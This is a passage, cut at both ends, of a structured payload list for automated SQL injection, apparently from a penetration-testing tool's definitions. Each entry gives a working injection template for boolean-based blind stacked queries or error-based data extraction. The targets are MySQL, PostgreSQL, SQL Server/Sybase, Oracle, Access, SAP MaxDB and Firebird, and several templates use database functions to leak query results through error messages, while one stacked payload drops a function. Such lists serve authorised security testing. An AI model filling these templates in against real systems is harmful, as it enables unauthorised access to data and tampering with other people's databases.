WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)'}, 'vector': ',(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'comparison': ',(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 boolean-based blind - Stacked queries', 'clause': [0], 'level': 4, 'request': {'comment': '#', 'payload': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'comparison': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL < 5.0 boolean-based blind - Stacked queries', 'clause': [0], 'level': 5, 'request': {'comment': '#', 'payload': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END)', 'details': {'dbms': 'MySQL', 'dbms_version': '< 5.0'}, 'where': [1], 'response': {'comparison': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END)'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Stacked queries', 'clause': [0], 'level': 3, 'request': {'comment': '--', 'payload': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'comparison': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)', 'clause': [0], 'level': 5, 'request': {'comment': '--', 'payload': ';SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1'}, 'vector': ';SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'comparison': ';SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)', 'clause': [0], 'level': 3, 'request': {'comment': '--', 'payload': ';IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]'}, 'vector': ';IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'comparison': ';IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'comparison': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)'}, 'stype': 1}, {'risk': 1, 'title': 'Oracle boolean-based blind - Stacked queries', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL'}, 'vector': ';SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'comparison': ';SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft Access boolean-based blind - Stacked queries', 'clause': [0], 'level': 5, 'request': {'comment': '%16', 'payload': ';IIF([RANDNUM]=[RANDNUM],1,1/0)'}, 'vector': ';IIF([INFERENCE],1,1/0)', 'details': {'dbms': 'Microsoft Access'}, 'where': [1], 'response': {'comparison': ';IIF([RANDNUM]=[RANDNUM1],1,1/0)'}, 'stype': 1}, {'risk': 1, 'title': 'SAP MaxDB boolean-based blind - Stacked queries', 'clause': [0], 'level': 5, 'request': {'comment': '--', 'payload': ';SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END'}, 'vector': ';SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'comparison': ';SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, 'vector': "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, 'vector': "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, 'vector': "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, 'vector': "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, 'vector': "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, 'vector': "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, 'vector': "AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (EXP)', 'clause': [1], 'level': 4, 'request': {'payload': "OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, 'vector': "OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, 'vector': "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)', 'clause': [1], 'level': 4, 'request': {'payload': "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, 'vector': "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.5'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, 'vector': "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 4.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause', 'clause': [1], 'level': 2, 'request': {'payload': "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, 'vector': "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 4.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'MySQL OR error-based - WHERE or HAVING clause', 'clause': [1], 'level': 3, 'request': {'comment': '#', 'payload': "OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)"}, 'vector': "OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)", 'details': {'dbms': 'MySQL'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'PostgreSQL AND error-based - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': "AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, 'vector': "AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'PostgreSQL OR error-based - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': "OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, 'vector': "OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", 'details': {'dbms': 'PostgreSQL'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, 'vector': "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, 'vector': "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)', 'clause': [1], 'level': 2, 'request': {'payload': "AND [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, 'vector': "AND [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)', 'clause': [1], 'level': 2, 'request': {'payload': "OR [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, 'vector': "OR [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle AND error-based - WHERE or HAVING clause (XMLType)', 'clause': [1], 'level': 1, 'request': {'payload': "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, 'vector': "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Oracle OR error-based - WHERE or HAVING clause (XMLType)', 'clause': [1], 'level': 1, 'request': {'payload': "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, 'vector': "OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)', 'clause': [1], 'level': 2, 'request': {'payload': "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, 'vector': "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle', 'dbms_version': '>= 8.1.6'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)', 'clause': [1], 'level': 2, 'request': {'payload': "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, 'vector': "OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle', 'dbms_version': '>= 8.1.6'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)', 'clause': [1], 'level': 3, 'request': {'payload': "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, 'vector': "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)', 'clause': [1], 'level': 3, 'request': {'payload': "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, 'vector': "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)', 'clause': [1], 'level': 4, 'request': {'payload': "AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, 'vector': "AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)', 'clause': [1], 'level': 4, 'request': {'payload': "OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, 'vector': "OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Oracle'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'Firebird AND error-based - WHERE or HAVING clause', 'clause': [1], 'level': 3, 'request': {'payload': "AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, 'vector': "AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Firebird'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 3, 'title': 'Firebird OR error-based - WHERE or HAVING clause', 'clause': [1], 'level': 3, 'request': {'payload': "OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, 'vector': "OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", 'details': {'dbms': 'Firebird'}, 'where': [2], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)', 'clause': [1, 2, 3, 4, 5], 'level': 2, 'request': {'payload': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)"}, 'vector': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.1'}, 'where': [1], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.0 error-based - Parameter replace', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, 'vector': "(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [3], 'response': {'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]'}, 'stype': 2}, {'risk': 1, 'title': 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)', 